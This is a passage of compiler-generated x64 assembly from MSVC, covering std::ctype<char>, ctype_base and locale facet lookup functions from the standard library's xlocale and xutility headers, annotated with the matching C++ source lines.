?do_widen@?$ctype@D@std@@MEBAPEBDPEBD0PEAD@Z PROC	; std::ctype<char>::do_widen, COMDAT

; 2773 :         const char* _First, const char* _Last, _Elem* _Dest) const { // widen chars in [_First, _Last)

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2774 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEBDPEBD@std@@YAXAEBQEBD0@Z ; std::_Adl_verify_range<char const *,char const *>

; 2775 :         _CSTD memcpy(_Dest, _First, static_cast<size_t>(_Last - _First));

	mov	rax, QWORD PTR _First$[rsp]
	mov	rcx, QWORD PTR _Last$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	r8, rax
	mov	rdx, QWORD PTR _First$[rsp]
	mov	rcx, QWORD PTR _Dest$[rsp]
	call	memcpy

; 2776 :         return _Last;

	mov	rax, QWORD PTR _Last$[rsp]

; 2777 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_widen@?$ctype@D@std@@MEBAPEBDPEBD0PEAD@Z ENDP	; std::ctype<char>::do_widen
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_widen@?$ctype@D@std@@MEBADD@Z
_TEXT	SEGMENT
this$ = 8
_Byte$ = 16
?do_widen@?$ctype@D@std@@MEBADD@Z PROC			; std::ctype<char>::do_widen, COMDAT

; 2768 :     virtual _Elem __CLR_OR_THIS_CALL do_widen(char _Byte) const { // widen char

	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx

; 2769 :         return _Byte;

	movzx	eax, BYTE PTR _Byte$[rsp]

; 2770 :     }

	ret	0
?do_widen@?$ctype@D@std@@MEBADD@Z ENDP			; std::ctype<char>::do_widen
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_toupper@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z
_TEXT	SEGMENT
this$ = 48
_First$ = 56
_Last$ = 64
?do_toupper@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z PROC	; std::ctype<char>::do_toupper, COMDAT

; 2759 :         const _Elem* _Last) const { // convert [_First, _Last) in place to upper case

$LN6:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2760 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEADPEBD@std@@YAXAEBQEADAEBQEBD@Z ; std::_Adl_verify_range<char *,char const *>

; 2761 :         for (; _First != _Last; ++_First) {

	jmp	SHORT $LN4@do_toupper
$LN2@do_toupper:
	mov	rax, QWORD PTR _First$[rsp]
	inc	rax
	mov	QWORD PTR _First$[rsp], rax
$LN4@do_toupper:
	mov	rax, QWORD PTR _Last$[rsp]
	cmp	QWORD PTR _First$[rsp], rax
	je	SHORT $LN3@do_toupper

; 2762 :             *_First = static_cast<_Elem>(_Toupper(static_cast<unsigned char>(*_First), &_Ctype));

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 16
	mov	rcx, QWORD PTR _First$[rsp]
	movzx	ecx, BYTE PTR [rcx]
	mov	rdx, rax
	call	_Toupper
	mov	rcx, QWORD PTR _First$[rsp]
	mov	BYTE PTR [rcx], al

; 2763 :         }

	jmp	SHORT $LN2@do_toupper
$LN3@do_toupper:

; 2764 : 
; 2765 :         return _First;

	mov	rax, QWORD PTR _First$[rsp]

; 2766 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_toupper@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z ENDP	; std::ctype<char>::do_toupper
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_toupper@?$ctype@D@std@@MEBADD@Z
_TEXT	SEGMENT
this$ = 48
_Ch$ = 56
?do_toupper@?$ctype@D@std@@MEBADD@Z PROC		; std::ctype<char>::do_toupper, COMDAT

; 2754 :     virtual _Elem __CLR_OR_THIS_CALL do_toupper(_Elem _Ch) const { // convert element to upper case

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2755 :         return static_cast<_Elem>(_Toupper(static_cast<unsigned char>(_Ch), &_Ctype));

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 16
	movzx	ecx, BYTE PTR _Ch$[rsp]
	mov	rdx, rax
	call	_Toupper

; 2756 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_toupper@?$ctype@D@std@@MEBADD@Z ENDP		; std::ctype<char>::do_toupper
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_tolower@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z
_TEXT	SEGMENT
this$ = 48
_First$ = 56
_Last$ = 64
?do_tolower@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z PROC	; std::ctype<char>::do_tolower, COMDAT

; 2745 :         const _Elem* _Last) const { // convert [_First, _Last) in place to lower case

$LN6:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2746 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEADPEBD@std@@YAXAEBQEADAEBQEBD@Z ; std::_Adl_verify_range<char *,char const *>

; 2747 :         for (; _First != _Last; ++_First) {

	jmp	SHORT $LN4@do_tolower
$LN2@do_tolower:
	mov	rax, QWORD PTR _First$[rsp]
	inc	rax
	mov	QWORD PTR _First$[rsp], rax
$LN4@do_tolower:
	mov	rax, QWORD PTR _Last$[rsp]
	cmp	QWORD PTR _First$[rsp], rax
	je	SHORT $LN3@do_tolower

; 2748 :             *_First = static_cast<_Elem>(_Tolower(static_cast<unsigned char>(*_First), &_Ctype));

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 16
	mov	rcx, QWORD PTR _First$[rsp]
	movzx	ecx, BYTE PTR [rcx]
	mov	rdx, rax
	call	_Tolower
	mov	rcx, QWORD PTR _First$[rsp]
	mov	BYTE PTR [rcx], al

; 2749 :         }

	jmp	SHORT $LN2@do_tolower
$LN3@do_tolower:

; 2750 : 
; 2751 :         return _First;

	mov	rax, QWORD PTR _First$[rsp]

; 2752 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_tolower@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z ENDP	; std::ctype<char>::do_tolower
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_tolower@?$ctype@D@std@@MEBADD@Z
_TEXT	SEGMENT
this$ = 48
_Ch$ = 56
?do_tolower@?$ctype@D@std@@MEBADD@Z PROC		; std::ctype<char>::do_tolower, COMDAT

; 2740 :     virtual _Elem __CLR_OR_THIS_CALL do_tolower(_Elem _Ch) const { // convert element to lower case

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2741 :         return static_cast<_Elem>(_Tolower(static_cast<unsigned char>(_Ch), &_Ctype));

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 16
	movzx	ecx, BYTE PTR _Ch$[rsp]
	mov	rdx, rax
	call	_Tolower

; 2742 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_tolower@?$ctype@D@std@@MEBADD@Z ENDP		; std::ctype<char>::do_tolower
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?_Tidy@?$ctype@D@std@@IEAAXXZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
?_Tidy@?$ctype@D@std@@IEAAXXZ PROC			; std::ctype<char>::_Tidy, COMDAT

; 2730 :     void __CLR_OR_THIS_CALL _Tidy() noexcept { // free any allocated storage

$LN6:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 2731 :         if (0 < _Ctype._Delfl) {

	mov	rax, QWORD PTR this$[rsp]
	cmp	DWORD PTR [rax+32], 0
	jle	SHORT $LN2@Tidy

; 2732 :             _CSTD free(const_cast<short*>(_Ctype._Table));

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+24]
	call	free
	jmp	SHORT $LN3@Tidy
$LN2@Tidy:

; 2733 :         } else if (_Ctype._Delfl < 0) {

	mov	rax, QWORD PTR this$[rsp]
	cmp	DWORD PTR [rax+32], 0
	jge	SHORT $LN3@Tidy

; 2734 :             delete[] _Ctype._Table;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR $T1[rsp]
	call	??_V@YAXPEAX@Z				; operator delete[]
$LN3@Tidy:

; 2735 :         }
; 2736 : 
; 2737 :         _CSTD free(_Ctype._LocaleName);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+40]
	call	free

; 2738 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Tidy@?$ctype@D@std@@IEAAXXZ ENDP			; std::ctype<char>::_Tidy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?_Init@?$ctype@D@std@@IEAAXAEBV_Locinfo@2@@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 96
_Lobj$ = 104
?_Init@?$ctype@D@std@@IEAAXAEBV_Locinfo@2@@Z PROC	; std::ctype<char>::_Init, COMDAT

; 2726 :     void __CLR_OR_THIS_CALL _Init(const _Locinfo& _Lobj) { // initialize from _Lobj

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 72					; 00000048H

; 2727 :         _Ctype = _Lobj._Getctype();

	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, QWORD PTR _Lobj$[rsp]
	call	?_Getctype@_Locinfo@std@@QEBA?AU_Ctypevec@@XZ ; std::_Locinfo::_Getctype
	mov	rcx, QWORD PTR this$[rsp]
	lea	rdi, QWORD PTR [rcx+16]
	mov	rsi, rax
	mov	ecx, 32					; 00000020H
	rep movsb

; 2728 :     }

	add	rsp, 72					; 00000048H
	pop	rdi
	pop	rsi
	ret	0
?_Init@?$ctype@D@std@@IEAAXAEBV_Locinfo@2@@Z ENDP	; std::ctype<char>::_Init
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??1?$ctype@D@std@@MEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$ctype@D@std@@MEAA@XZ PROC				; std::ctype<char>::~ctype<char>, COMDAT

; 2722 :     __CLR_OR_THIS_CALL ~ctype() noexcept override {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7?$ctype@D@std@@6B@
	mov	QWORD PTR [rax], rcx

; 2723 :         _Tidy();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy@?$ctype@D@std@@IEAAXXZ		; std::ctype<char>::_Tidy

; 2724 :     }

	mov	rcx, QWORD PTR this$[rsp]
	call	??1ctype_base@std@@UEAA@XZ		; std::ctype_base::~ctype_base
	add	rsp, 40					; 00000028H
	ret	0
??1?$ctype@D@std@@MEAA@XZ ENDP				; std::ctype<char>::~ctype<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 40
tv89 = 48
tv131 = 56
tv128 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z PROC ; std::ctype<char>::_Getcat, COMDAT

; 2703 :     static size_t __CLRCALL_OR_CDECL _Getcat(const locale::facet** _Ppf = nullptr, const locale* _Ploc = nullptr) {

$LN10:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 200				; 000000c8H
	mov	DWORD PTR $T1[rsp], 0

; 2704 :         if (_Ppf && !*_Ppf) {

	cmp	QWORD PTR _Ppf$[rsp], 0
	je	$LN2@Getcat
	mov	rax, QWORD PTR _Ppf$[rsp]
	cmp	QWORD PTR [rax], 0
	jne	$LN2@Getcat

; 2705 :             *_Ppf = new ctype<_Elem>(_Locinfo(_Ploc->c_str()));

	mov	ecx, 48					; 00000030H
	call	??2@YAPEAX_K@Z				; operator new
	mov	QWORD PTR $T2[rsp], rax
	cmp	QWORD PTR $T2[rsp], 0
	je	SHORT $LN4@Getcat
	mov	rcx, QWORD PTR _Ploc$[rsp]
	call	?c_str@locale@std@@QEBAPEBDXZ		; std::locale::c_str
	mov	rdx, rax
	lea	rcx, QWORD PTR $T4[rsp]
	call	??0_Locinfo@std@@QEAA@PEBD@Z		; std::_Locinfo::_Locinfo
	mov	QWORD PTR tv131[rsp], rax
	mov	rax, QWORD PTR tv131[rsp]
	mov	QWORD PTR tv128[rsp], rax
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	xor	r8d, r8d
	mov	rdx, QWORD PTR tv128[rsp]
	mov	rcx, QWORD PTR $T2[rsp]
	call	??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z ; std::ctype<char>::ctype<char>
	mov	QWORD PTR tv89[rsp], rax
	jmp	SHORT $LN5@Getcat
$LN4@Getcat:
	mov	QWORD PTR tv89[rsp], 0
$LN5@Getcat:
	mov	rax, QWORD PTR tv89[rsp]
	mov	QWORD PTR $T3[rsp], rax
	mov	rax, QWORD PTR _Ppf$[rsp]
	mov	rcx, QWORD PTR $T3[rsp]
	mov	QWORD PTR [rax], rcx
	mov	eax, DWORD PTR $T1[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@Getcat
	and	DWORD PTR $T1[rsp], -2
	lea	rcx, QWORD PTR $T4[rsp]
	call	??1_Locinfo@std@@QEAA@XZ		; std::_Locinfo::~_Locinfo
$LN2@Getcat:

; 2706 :         }
; 2707 : 
; 2708 :         return _X_CTYPE;

	mov	eax, 2

; 2709 :     }

	add	rsp, 200				; 000000c8H
	ret	0
?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ENDP ; std::ctype<char>::_Getcat
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
tv89 = 48
tv131 = 56
tv128 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?dtor$0@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA PROC ; `std::ctype<char>::_Getcat'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	edx, 48					; 00000030H
	mov	rcx, QWORD PTR $T2[rbp]
	call	??3@YAXPEAX_K@Z				; operator delete
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA ENDP ; `std::ctype<char>::_Getcat'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
tv89 = 48
tv131 = 56
tv128 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?dtor$1@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA PROC ; `std::ctype<char>::_Getcat'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	eax, DWORD PTR $T1[rbp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN8@dtor$1
	and	DWORD PTR $T1[rbp], -2
	lea	rcx, QWORD PTR $T4[rbp]
	call	??1_Locinfo@std@@QEAA@XZ		; std::_Locinfo::~_Locinfo
$LN8@dtor$1:
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA ENDP ; `std::ctype<char>::_Getcat'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z
_TEXT	SEGMENT
this$ = 48
_Lobj$ = 56
_Refs$ = 64
??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z PROC		; std::ctype<char>::ctype<char>, COMDAT

; 2699 :     __CLR_OR_THIS_CALL ctype(const _Locinfo& _Lobj, size_t _Refs = 0) : ctype_base(_Refs) {

$LN4:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR _Refs$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0ctype_base@std@@QEAA@_K@Z		; std::ctype_base::ctype_base
	npad	1
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7?$ctype@D@std@@6B@
	mov	QWORD PTR [rax], rcx

; 2700 :         _Init(_Lobj);

	mov	rdx, QWORD PTR _Lobj$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Init@?$ctype@D@std@@IEAAXAEBV_Locinfo@2@@Z ; std::ctype<char>::_Init
	npad	1

; 2701 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z ENDP		; std::ctype<char>::ctype<char>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Lobj$ = 56
_Refs$ = 64
?dtor$0@?0???0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA PROC ; `std::ctype<char>::ctype<char>'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1ctype_base@std@@UEAA@XZ		; std::ctype_base::~ctype_base
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA ENDP ; `std::ctype<char>::ctype<char>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?widen@?$ctype@D@std@@QEBAPEBDPEBD0PEAD@Z
_TEXT	SEGMENT
this$ = 48
_First$ = 56
_Last$ = 64
_Dest$ = 72
?widen@?$ctype@D@std@@QEBAPEBDPEBD0PEAD@Z PROC		; std::ctype<char>::widen, COMDAT

; 2667 :         _Elem* _Dest) const { // widen chars in [_First, _Last)

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2668 :         return do_widen(_First, _Last, _Dest);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	r9, QWORD PTR _Dest$[rsp]
	mov	r8, QWORD PTR _Last$[rsp]
	mov	rdx, QWORD PTR _First$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+56]

; 2669 :     }

	add	rsp, 40					; 00000028H
	ret	0
?widen@?$ctype@D@std@@QEBAPEBDPEBD0PEAD@Z ENDP		; std::ctype<char>::widen
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?widen@?$ctype@D@std@@QEBADD@Z
_TEXT	SEGMENT
this$ = 48
_Byte$ = 56
?widen@?$ctype@D@std@@QEBADD@Z PROC			; std::ctype<char>::widen, COMDAT

; 2662 :     _Elem __CLR_OR_THIS_CALL widen(char _Byte) const { // widen char

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2663 :         return do_widen(_Byte);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movzx	edx, BYTE PTR _Byte$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+64]

; 2664 :     }

	add	rsp, 40					; 00000028H
	ret	0
?widen@?$ctype@D@std@@QEBADD@Z ENDP			; std::ctype<char>::widen
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gctype_base@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gctype_base@std@@UEAAPEAXI@Z PROC			; std::ctype_base::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1ctype_base@std@@UEAA@XZ		; std::ctype_base::~ctype_base
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 16
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_Gctype_base@std@@UEAAPEAXI@Z ENDP			; std::ctype_base::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??1ctype_base@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1ctype_base@std@@UEAA@XZ PROC				; std::ctype_base::~ctype_base, COMDAT

; 2358 :     __CLR_OR_THIS_CALL ~ctype_base() noexcept override {}

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7ctype_base@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rcx, QWORD PTR this$[rsp]
	call	??1facet@locale@std@@MEAA@XZ		; std::locale::facet::~facet
	add	rsp, 40					; 00000028H
	ret	0
??1ctype_base@std@@UEAA@XZ ENDP				; std::ctype_base::~ctype_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??0ctype_base@std@@QEAA@_K@Z
_TEXT	SEGMENT
this$ = 48
_Refs$ = 56
??0ctype_base@std@@QEAA@_K@Z PROC			; std::ctype_base::ctype_base, COMDAT

; 2356 :     __CLR_OR_THIS_CALL ctype_base(size_t _Refs = 0) : locale::facet(_Refs) {}

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR _Refs$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0facet@locale@std@@IEAA@_K@Z		; std::locale::facet::facet
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7ctype_base@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0ctype_base@std@@QEAA@_K@Z ENDP			; std::ctype_base::ctype_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Adl_verify_range@PEB_WPEB_W@std@@YAXAEBQEB_W0@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
??$_Adl_verify_range@PEB_WPEB_W@std@@YAXAEBQEB_W0@Z PROC ; std::_Adl_verify_range<wchar_t const *,wchar_t const *>, COMDAT

; 1331 : constexpr void _Adl_verify_range(const _Iter& _First, const _Sentinel& _Last) {

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 1332 :     // check that [_First, _Last) forms an iterator range
; 1333 :     if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1334 :         _Verify_range(_First, _Last);
; 1335 :     }
; 1336 : }

	ret	0
??$_Adl_verify_range@PEB_WPEB_W@std@@YAXAEBQEB_W0@Z ENDP ; std::_Adl_verify_range<wchar_t const *,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Adl_verify_range@PEBDPEBD@std@@YAXAEBQEBD0@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
??$_Adl_verify_range@PEBDPEBD@std@@YAXAEBQEBD0@Z PROC	; std::_Adl_verify_range<char const *,char const *>, COMDAT

; 1331 : constexpr void _Adl_verify_range(const _Iter& _First, const _Sentinel& _Last) {

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 1332 :     // check that [_First, _Last) forms an iterator range
; 1333 :     if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1334 :         _Verify_range(_First, _Last);
; 1335 :     }
; 1336 : }

	ret	0
??$_Adl_verify_range@PEBDPEBD@std@@YAXAEBQEBD0@Z ENDP	; std::_Adl_verify_range<char const *,char const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z
_TEXT	SEGMENT
tv71 = 32
_Facptr$ = 40
_Ptr0$ = 48
this$ = 80
_Id$ = 88
?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z PROC	; std::locale::_Getfacet, COMDAT

; 368  :     const facet* _Getfacet(size_t _Id) const { // look up a facet in locale object

$LN8:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 369  :         const facet* _Facptr = _Id < _Ptr->_Facetcount ? _Ptr->_Facetvec[_Id] : nullptr; // null if id off end

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	mov	rax, QWORD PTR [rax+24]
	cmp	QWORD PTR _Id$[rsp], rax
	jae	SHORT $LN6@Getfacet
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	mov	rax, QWORD PTR [rax+16]
	mov	rcx, QWORD PTR _Id$[rsp]
	mov	rax, QWORD PTR [rax+rcx*8]
	mov	QWORD PTR tv71[rsp], rax
	jmp	SHORT $LN7@Getfacet
$LN6@Getfacet:
	mov	QWORD PTR tv71[rsp], 0
$LN7@Getfacet:
	mov	rax, QWORD PTR tv71[rsp]
	mov	QWORD PTR _Facptr$[rsp], rax

; 370  :         if (_Facptr || !_Ptr->_Xparent) {

	cmp	QWORD PTR _Facptr$[rsp], 0
	jne	SHORT $LN3@Getfacet
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	movzx	eax, BYTE PTR [rax+36]
	test	eax, eax
	jne	SHORT $LN2@Getfacet
$LN3@Getfacet:

; 371  :             return _Facptr; // found facet or not transparent

	mov	rax, QWORD PTR _Facptr$[rsp]
	jmp	SHORT $LN1@Getfacet
$LN2@Getfacet:

; 372  :         }
; 373  : 
; 374  :         // look in current locale
; 375  :         locale::_Locimp* _Ptr0 = _Getgloballocale();

	call	?_Getgloballocale@locale@std@@CAPEAV_Locimp@12@XZ ; std::locale::_Getgloballocale
	mov	QWORD PTR _Ptr0$[rsp], rax

; 376  :         if (_Id < _Ptr0->_Facetcount) {

	mov	rax, QWORD PTR _Ptr0$[rsp]
	mov	rax, QWORD PTR [rax+24]
	cmp	QWORD PTR _Id$[rsp], rax
	jae	SHORT $LN4@Getfacet

; 377  :             return _Ptr0->_Facetvec[_Id]; // get from current locale

